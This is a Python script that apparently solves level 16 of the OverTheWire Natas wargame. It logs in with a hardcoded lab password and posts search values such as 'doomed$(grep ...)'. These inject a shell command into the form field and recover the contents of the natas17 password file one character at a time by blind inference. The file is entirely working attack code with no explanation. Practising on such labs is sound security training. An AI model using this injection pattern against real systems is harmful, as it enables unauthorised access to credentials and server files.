import requests
import string
from numpy import integer


allChars = string.ascii_letters+string.digits
dictChars = ""
passL = 32
passw = ""

print "Recovering all possible chars ..."
for c in allChars:
    r = requests.post('http://natas16.natas.labs.overthewire.org/index.php?', auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'),data={'needle':'doomed$(grep '+c+' /etc/natas_webpass/natas17)'})
    if not "doomed" in r.text:
        print dictChars
        dictChars += c
print "=> all possible chars :",dictChars

for i in range(passL):
    for c in dictChars:
        r = requests.post('http://natas16.natas.labs.overthewire.org/index.php?', auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'),data={'needle':'doomed$(grep '+passw+c+' /etc/natas_webpass/natas17)'})
        if not "doomed" in r.text:
            passw += c
            print "Success :",passw
            break

print "=> password is :",passw     